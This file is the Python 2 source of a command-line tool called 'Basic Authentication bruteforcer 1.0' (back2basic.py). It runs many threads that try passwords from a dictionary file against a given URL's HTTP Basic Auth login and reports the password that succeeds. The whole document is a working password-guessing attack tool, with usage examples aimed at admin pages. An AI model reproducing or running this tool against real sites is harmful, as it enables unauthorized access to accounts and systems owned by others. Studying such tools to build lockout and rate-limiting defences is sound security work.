import requests
from threading import Thread
import sys
import time
import getopt
from termcolor import colored

global hit  # Flag to know when we have a valid password
hit = "1"


def banner():
    print "\n***************************************"
    print "* Basic Authentication bruteforcer 1.0*"
    print "***************************************"


def usage():
    print "Usage:"
    print "		-w: url (http://somesite.com/admin)"
    print "		-u: username"
    print "		-t: threads"
    print "		-f: dictionary file\n"
    print "example: back2basic.py -w http://www.somesite.com/admin -u admin -t 5 -f pass.txt\n"


class request_performer(Thread):
    def __init__(self, name, user, url):
        Thread.__init__(self)
        self.password = name.split("\n")[0]
        self.username = user
        self.url = url
        print "-" + self.password + "-"

    def run(self):
        global hit
        if hit == "1":
            try:
                r = requests.get(self.url, auth=(self.username, self.password))
                if r.status_code == 200:
                    hit = "0"
                    print "[+] Password found - " + colored(self.password, 'green') + "  - !!!\r"
                    sys.exit()
                else:
                    print "Not valid " + self.password
                    i[0] = i[0] - 1  # Here we remove one thread from the counter
            except Exception, e:
                print e


def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:t:")
    except getopt.GetoptError:
        print "Error en arguments"
        sys.exit()

    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictio = arg
        elif opt == '-t':
            threads = arg
    try:
        f = open(dictio, "r")
        name = f.readlines()
    except:
        print"Failed opening file: " + dictio + "\n"
        sys.exit()
    launcher_thread(name, threads, user, url)


def launcher_thread(names, th, username, url):
    global i
    i = []
    i.append(0)
    while len(names):
        if hit == "1":
            try:
                if i[0] < th:
                    n = names.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(n, username, url)
                    thread.start()

            except KeyboardInterrupt:
                print "Brute forcer interrupted  by user. Finishing attack.."
                sys.exit()
            thread.join()
        else:
            sys.exit()
    return


if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print "Brute force interrupted by user, killing all threads..!!"
